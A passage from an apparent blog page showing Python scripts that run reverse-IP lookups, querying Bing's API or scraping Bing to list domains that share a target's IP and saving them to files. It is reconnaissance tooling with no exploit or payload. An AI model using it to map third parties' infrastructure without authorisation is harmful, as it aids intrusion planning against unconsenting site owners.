                <span class="n">origin_https_domain_url_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">piece</span><span class="p">[</span><span class="sh">'</span><span class="s">Url</span><span class="sh">'</span><span class="p">])</span>
              
            
        <span class="k">else</span><span class="p">:</span>
            <span class="n">domain</span><span class="o">=</span><span class="n">piece</span><span class="p">[</span><span class="sh">'</span><span class="s">Url</span><span class="sh">'</span><span class="p">][</span><span class="mi">7</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
            <span class="c1">#print '222222222222222222222222222222222222222:'+domain+'333333:'+getIp(domain)
</span>            <span class="c1">#if domain not in domain_list:# and getIp(domain)==ip
</span>            <span class="k">if</span> <span class="n">domain</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">domain_list</span> <span class="ow">and</span> <span class="nf">getIp</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span> <span class="ow">in</span> <span class="n">all_nics_ip</span><span class="p">:</span>                
                <span class="n">domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
                <span class="n">https_domain_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="sh">"</span><span class="s">https://</span><span class="sh">"</span><span class="o">+</span><span class="n">domain</span><span class="p">)</span>
                <span class="n">origin_https_domain_url_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">piece</span><span class="p">[</span><span class="sh">'</span><span class="s">Url</span><span class="sh">'</span><span class="p">])</span>
    <span class="c1">#in the upon for circle,function getIp is ok ,but sometimes we will get two diffirent address
</span>    <span class="c1">#when ping some domain,eg.ping defendmainstreet.com  !sometimes we get ip:104.25.209.15
</span>    <span class="c1">#sometimes we get 104.25.208.15,this is a strange thing ,may be there exists two NICs on the 
</span>    <span class="c1">#same domain,so here ,without check"and getIp(domain)==ip" is better to gain more results
</span>    <span class="c1">#although this will get little useless domain.eg. when we try to find the domains of www.baidu.com
</span>    <span class="c1">#we will find there would be a domain named "msh.baidu.com",both "k8" and this script will get it,
</span>    <span class="c1">#but actually,we can get msh.baidu.com is not the same ip than www.baidu.com by pinging them.
</span>    <span class="c1">#if here we don't use check"and getIp(domain)==ip",however,the better and best result chioce is,
</span>    <span class="c1">#don't use check"getIp(domain)==ip",finally,this tool is better than k8 from experiment.
</span>    

    <span class="c1">#later i found those comments upon are right ,and there exists a better solution,
</span>    <span class="c1">#that is use function "gethostbyname_ex",
</span>    <span class="c1">#more info see https://walkerqt.blog.51cto.com/1310630/1686735
</span>
    <span class="c1">#print "getip(192.168.0.1)is :%s" % getIp("192.168.0.1")
</span>    <span class="k">print</span> <span class="sh">"</span><span class="s">domain list is:</span><span class="sh">"</span> 
    <span class="k">for</span> <span class="n">pie</span> <span class="ow">in</span> <span class="n">domain_list</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">pie</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">https_domain_list is:</span><span class="sh">"</span>
    <span class="k">for</span> <span class="n">pie</span> <span class="ow">in</span> <span class="n">https_domain_list</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">pie</span>
    <span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">domain_list</span><span class="p">,</span><span class="sh">"</span><span class="s">bing_domain_list.txt</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">https_domain_list</span><span class="p">,</span><span class="sh">"</span><span class="s">bing_https_domain_list.txt</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">origin_https_domain_url_list</span><span class="p">,</span><span class="sh">"</span><span class="s">bing_origin_https_domain_url_list.txt</span><span class="sh">"</span><span class="p">)</span>


    <span class="c1">#now we get the domain_list,https'url's domain included,
</span>    <span class="c1">#and saved the urls to file
</span>    

    <span class="c1">#print bing_search(query, 'Image')
</span>


<span class="c1">#this is a function to get a ip from a domain
</span>
<span class="k">def</span> <span class="nf">getIp</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>
    <span class="kn">import</span> <span class="n">socket</span>   
    <span class="k">try</span><span class="p">:</span>
        <span class="n">myaddr</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">getaddrinfo</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span><span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
        <span class="k">return</span> <span class="n">myaddr</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span> <span class="sh">"</span><span class="s">getip wrong5555555555555555</span><span class="sh">"</span>


<span class="c1">#this is a function to remove \r\n or \n from one sting
</span><span class="k">def</span> <span class="nf">get_pure_list</span><span class="p">(</span><span class="nb">list</span><span class="p">):</span>
    <span class="n">pure_list</span><span class="o">=</span><span class="p">[]</span>
    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">:</span>
        <span class="n">each</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(https://)|(https://)|(\s)|(/.*)|(:.*)</span><span class="sh">'</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
        <span class="n">pure_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
        <span class="c1">#re.sub(r'\r\n',"",each)
</span>        <span class="c1">#re.sub(r'\n',"",each)
</span>    <span class="k">return</span> <span class="n">pure_list</span>

<span class="c1">#this is my write url to file function:
</span><span class="k">def</span> <span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">url_list</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
    <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="p">)</span>
    <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>   
    <span class="k">for</span> <span class="n">ur</span> <span class="ow">in</span> <span class="n">url_list</span><span class="p">:</span>
        <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>  
        <span class="sh">'''</span><span class="s">
        python3下不可写成</span><span class="sh">"</span><span class="s">ab+</span><span class="sh">"</span><span class="s">,although in linux,且</span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="s">不能支持readlines,读不出来数据,i chosed </span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="s"> for file write,and close file,then </span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="s"> for f.readlines(),
        于是python3下还得事先创建url.txt,因为上面的</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="s">会发现没有urls.txt文件
        file=open(</span><span class="sh">"</span><span class="s">urls.txt</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">ab+</span><span class="sh">"</span><span class="s">)  python2 下可以</span><span class="sh">"</span><span class="s">ab+</span><span class="sh">"</span><span class="s"> 
        </span><span class="sh">'''</span>
        <span class="n">all_lines</span><span class="o">=</span><span class="nb">file</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">all_lines</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">all_lines</span><span class="p">))</span>
        <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

        <span class="c1">#if ur+"\r\n" not in all_lines:
</span>        <span class="k">if</span> <span class="n">ur</span><span class="o">+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">all_lines</span><span class="p">:</span>
            <span class="sh">'''</span><span class="s">
            python3下write(ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">)也只能在字符串后加到</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="s">,不会加上</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">,python2下write(ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">)是加上</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">
            所以python2下的if ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s"> not in all_lines要写成if ur+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="s"> not in all_lines
            </span><span class="sh">'''</span>
            <span class="c1">#print(type(ur))
</span>            <span class="c1">#print(type("\r\n"))
</span>            <span class="c1">#print(type(ur+"\r\n"))
</span>            <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="p">)</span>
            <span class="sh">'''</span><span class="s">
            file.write(ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">),python3下写成 ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s"> 或 ur+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="s"> 效果一样
            写成+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="s">则产生的文件放到windows下看不到换行的效果(形如https://xxx.xxx.xxxhtt://xxx.xxx.xxx),实际处理起来(读文件)好像也是
            有</span><span class="sh">"</span><span class="s">按换行读的效果的,file.write(ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">)会写成</span><span class="sh">'</span><span class="s">https://twitter.com</span><span class="se">\n</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">https://twitter.com</span><span class="se">\n</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">https://twitter.com/hashtag</span><span class="se">\n</span><span class="sh">'</span><span class="s">的效果</span><span class="sh">"</span><span class="s">

            </span><span class="sh">'''</span>
            <span class="c1">#print 11112212
</span>            <span class="k">print</span> <span class="n">ur</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">ur</span><span class="o">+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>





<span class="c1">#blew is the main function to search use bing api
</span>

<span class="k">def</span> <span class="nf">bing_search</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">search_type</span><span class="p">):</span>
    <span class="c1">#search_type: Web, Image, News, Video
</span>    <span class="n">key</span><span class="o">=</span> <span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="nf">quote</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
    <span class="c1">#print "bing_search s query is %s" % query
</span>    <span class="c1"># create credential for authentication
</span>    <span class="n">user_agent</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)</span><span class="sh">'</span>
    <span class="n">credentials</span> <span class="o">=</span> <span class="p">(</span><span class="sh">'</span><span class="s">:%s</span><span class="sh">'</span> <span class="o">%</span> <span class="n">key</span><span class="p">).</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">base64</span><span class="sh">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">auth</span> <span class="o">=</span> <span class="sh">'</span><span class="s">Basic %s</span><span class="sh">'</span> <span class="o">%</span> <span class="n">credentials</span>
    <span class="k">print</span> <span class="n">auth</span>
    <span class="n">url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">https://api.datamarket.azure.com/Data.ashx/Bing/Search/</span><span class="sh">'</span><span class="o">+</span><span class="n">search_type</span><span class="o">+</span><span class="sh">'</span><span class="s">?Query=%27</span><span class="sh">'</span><span class="o">+</span><span class="n">query</span><span class="o">+</span><span class="sh">'</span><span class="s">%27&amp;$top=100&amp;$format=json</span><span class="sh">'</span> <span class="c1">#&amp;$top=5&amp;$format=json'
</span>    <span class="n">request</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="nc">Request</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="n">request</span><span class="p">.</span><span class="nf">add_header</span><span class="p">(</span><span class="sh">'</span><span class="s">Authorization</span><span class="sh">'</span><span class="p">,</span> <span class="n">auth</span><span class="p">)</span>
    <span class="n">request</span><span class="p">.</span><span class="nf">add_header</span><span class="p">(</span><span class="sh">'</span><span class="s">User-Agent</span><span class="sh">'</span><span class="p">,</span> <span class="n">user_agent</span><span class="p">)</span>
    <span class="n">request_opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="nf">build_opener</span><span class="p">()</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">request_opener</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="n">request</span><span class="p">)</span> 
    <span class="n">response_data</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="nf">read</span><span class="p">()</span>
    <span class="n">json_result</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">response_data</span><span class="p">)</span>
    <span class="n">result_list</span> <span class="o">=</span> <span class="n">json_result</span><span class="p">[</span><span class="sh">'</span><span class="s">d</span><span class="sh">'</span><span class="p">][</span><span class="sh">'</span><span class="s">results</span><span class="sh">'</span><span class="p">]</span>
    
    <span class="k">return</span> <span class="n">result_list</span>
 



<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">-----------------------------------------------------------</span><span class="sh">"</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">this is a py script to gain domains from the same ip</span><span class="se">\n</span><span class="s">usage:</span><span class="sh">"</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">example:python %s xxx.xxx.xxx</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">example:python %s file.txt</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">print</span> <span class="sh">"</span><span class="s">-----------------------------------------------------------</span><span class="sh">"</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">"</span><span class="s">__main__</span><span class="sh">"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>
</code></pre></div></div>

<p>3&gt;my_GoogleScraper_bing_domain.py</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#need python3 coz GoogleScraper require it.
#and python3 with GoogleScraper unchanged selenium version python environment,
#coz bing does not need supass yanzhengma
#on this computer is "workon virtualenv2"
#/root/myenv2/bin/python3.5m
#
#
##/root/myenv2/bin/python3.5m is the normal python3
#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python
</span>
<span class="kn">import</span> <span class="n">socket</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">os</span> 


<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-----------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">this is a py script to gain domains from the same ip</span><span class="se">\n</span><span class="s">usage:</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">example:python %s xxx.xxx.xxx</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">example:python %s -f file.txt</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">-----------------------------------------------------------</span><span class="sh">"</span><span class="p">)</span>


 <span class="c1">#this is a function to remove \r\n or \n from one sting   
</span><span class="k">def</span> <span class="nf">get_pure_list</span><span class="p">(</span><span class="nb">list</span><span class="p">):</span>
    <span class="n">pure_list</span><span class="o">=</span><span class="p">[]</span>
    <span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">:</span>
        <span class="n">each</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(https://)|(https://)|(\s)|(/.*)|(:.*)</span><span class="sh">'</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
        <span class="n">pure_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
        <span class="c1">#re.sub(r'\r\n',"",each)
</span>        <span class="c1">#re.sub(r'\n',"",each)
</span>    <span class="k">return</span> <span class="n">pure_list</span>
<span class="c1">#this is a function to save url_list to file
</span><span class="k">def</span> <span class="nf">save_url_to_file</span><span class="p">(</span><span class="n">url_list</span><span class="p">,</span><span class="n">name</span><span class="p">):</span>
    <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="p">)</span>
    <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>   
    <span class="k">for</span> <span class="n">ur</span> <span class="ow">in</span> <span class="n">url_list</span><span class="p">:</span>
        <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>  
        <span class="sh">'''</span><span class="s">
        python3下不可写成</span><span class="sh">"</span><span class="s">ab+</span><span class="sh">"</span><span class="s">,although in linux,且</span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="s">不能支持readlines,读不出来数据,i chosed </span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="s"> for file write,and close file,then </span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="s"> for f.readlines(),
        于是python3下还得事先创建url.txt,因为上面的</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="s">会发现没有urls.txt文件
        file=open(</span><span class="sh">"</span><span class="s">urls.txt</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">ab+</span><span class="sh">"</span><span class="s">)  python2 下可以</span><span class="sh">"</span><span class="s">ab+</span><span class="sh">"</span><span class="s"> 
        </span><span class="sh">'''</span>
        <span class="n">all_lines</span><span class="o">=</span><span class="nb">file</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">all_lines</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">all_lines</span><span class="p">))</span>
        <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

        <span class="c1">#if ur+"\r\n" not in all_lines:
</span>        <span class="k">if</span> <span class="n">ur</span><span class="o">+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">all_lines</span><span class="p">:</span>
            <span class="sh">'''</span><span class="s">
            python3下write(ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">)也只能在字符串后加到</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="s">,不会加上</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">,python2下write(ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">)是加上</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">
            所以python2下的if ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s"> not in all_lines要写成if ur+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="s"> not in all_lines
            </span><span class="sh">'''</span>
            <span class="c1">#print(type(ur))
</span>            <span class="c1">#print(type("\r\n"))
</span>            <span class="c1">#print(type(ur+"\r\n"))
</span>            <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="sh">"</span><span class="s">a+</span><span class="sh">"</span><span class="p">)</span>
            <span class="sh">'''</span><span class="s">
            file.write(ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">),python3下写成 ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s"> 或 ur+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="s"> 效果一样
            写成+</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="s">则产生的文件放到windows下看不到换行的效果(形如https://xxx.xxx.xxxhtt://xxx.xxx.xxx),实际处理起来(读文件)好像也是
            有</span><span class="sh">"</span><span class="s">按换行读的效果的,file.write(ur+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="s">)会写成</span><span class="sh">'</span><span class="s">https://twitter.com</span><span class="se">\n</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">https://twitter.com</span><span class="se">\n</span><span class="sh">'</span><span class="s">, </span><span class="sh">'</span><span class="s">https://twitter.com/hashtag</span><span class="se">\n</span><span class="sh">'</span><span class="s">的效果</span><span class="sh">"</span><span class="s">

            </span><span class="sh">'''</span>
            <span class="c1">#print 11112212
</span>            <span class="nf">print</span><span class="p">(</span><span class="n">ur</span><span class="p">)</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">ur</span><span class="o">+</span><span class="sh">"</span><span class="se">\r\n</span><span class="sh">"</span><span class="p">)</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
            <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
<span class="c1">#this is a function to get a ip from a domain
</span><span class="k">def</span> <span class="nf">getIp</span><span class="p">(</span><span class="n">domain</span><span class="p">):</span>    
    <span class="c1">#the below function getaddrinfo may not be good as function gethostbyname
</span>    <span class="k">try</span><span class="p">:</span>
    	<span class="n">myaddr</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">getaddrinfo</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span><span class="sh">'</span><span class="s">https</span><span class="sh">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">][</span><span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
    	<span class="k">return</span> <span class="n">myaddr</span>
    <span class="k">except</span><span class="p">:</span>
    	<span class="k">pass</span>





<span class="c1">#start from here actually if there is a main entrance
</span>
<span class="k">def</span> <span class="nf">myGoogleScraperbingdomains</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">'''</span><span class="s">make sure your ip will be recognized as useful ip to visit www.bing.com
 otherwise,you need use a vpn which will be treated as a ip can visit www.bing.com and
 will not turn you to cn.bing.com from www.bing.com,another way is use torbrowser instead
 of firefox explorer</span><span class="sh">'''</span><span class="p">)</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">!=</span><span class="mi">2</span> <span class="ow">and</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">!=</span><span class="sh">'</span><span class="s">-f</span><span class="sh">'</span><span class="p">:</span>
        <span class="nf">usage</span><span class="p">()</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="sh">'</span><span class="s">-f</span><span class="sh">'</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">444444444444success here</span><span class="sh">"</span><span class="p">)</span>
            <span class="nb">file</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">555555555555success here</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">except</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!sys.argv[2] is %s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">open file wrong</span><span class="sh">"</span><span class="p">)</span>
            <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

        <span class="n">target_list</span><span class="o">=</span><span class="nb">file</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">66666666666target_list is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">target_list</span><span class="p">)</span>
        <span class="nb">file</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="n">true_target_list</span><span class="o">=</span><span class="p">[]</span>
        <span class="n">true_target_list</span><span class="o">=</span><span class="nf">get_pure_list</span><span class="p">(</span><span class="n">target_list</span><span class="p">)</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">77777777777777pure_list is:%s</span><span class="sh">"</span> <span class="o">%</span> <span class="n">true_target_list</span><span class="p">)</span>
        <span class="k">for</span> <span class="n">each_domain</span> <span class="ow">in</span> <span class="n">true_target_list</span><span class="p">:</span>
        	<span class="k">try</span><span class="p">:</span>
        		<span class="n">keyword</span><span class="o">=</span><span class="sh">"</span><span class="s">ip:</span><span class="sh">"</span><span class="o">+</span><span class="nf">getIp</span><span class="p">(</span><span class="n">each_domain</span><span class="p">)</span>
        		<span class="n">num_page</span><span class="o">=</span><span class="mi">50</span>
        		<span class="n">method</span><span class="o">=</span><span class="sh">'</span><span class="s">selenium</span><span class="sh">'</span>
        		<span class="n">browser</span><span class="o">=</span><span class="sh">'</span><span class="s">firefox</span><span class="sh">'</span>
        	<span class="k">except</span><span class="p">:</span>
        		<span class="k">continue</span>
        	<span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">33333333333333success here</span><span class="sh">"</span><span class="p">)</span>
        	<span class="nf">get_the_one_target_domains</span><span class="p">(</span><span class="n">each_domain</span><span class="p">,</span><span class="n">keyword</span><span class="p">,</span><span class="n">num_page</span><span class="p">,</span><span class="n">method</span><span class="p">,</span><span class="n">browser</span><span class="p">)</span>
        	

    <span class="k">else</span><span class="p">:</span>
        <span class="c1">#print("please input the domain you want bing to search,eg.www.baidu.com:")#ip:111.111.111.111
</span>        <span class="c1">#sharedHost=input()
</span>        <span class="n">sharedHost</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
        <span class="n">keyword</span><span class="o">=</span><span class="sh">"</span><span class="s">ip:</span><span class="sh">"</span><span class="o">+</span><span class="n">socket</span><span class="p">.</span><span class="nf">gethostbyname</span><span class="p">(</span><span class="n">sharedHost</span><span class="p">)</span>        
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">please input the number of pages you want bing to search:</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">num_page</span><span class="o">=</span><span class="nf">int</span><span class="p">(</span><span class="nf">input</span><span class="p">())</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">please input the method you want bing to search {https,selenium,https-async} :</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">method</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">please input the browser you want google to use,this take </span><span class="se">\
</span><span class="s">        	effects only in [selenium] method,[https] or [https-async] any </span><span class="se">\
</span><span class="s">        	is ok,coz take no effects,input one of {firefox,chrome,phantomjs} here:</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">browser</span><span class="o">=</span><span class="nf">input</span><span class="p">()</span>
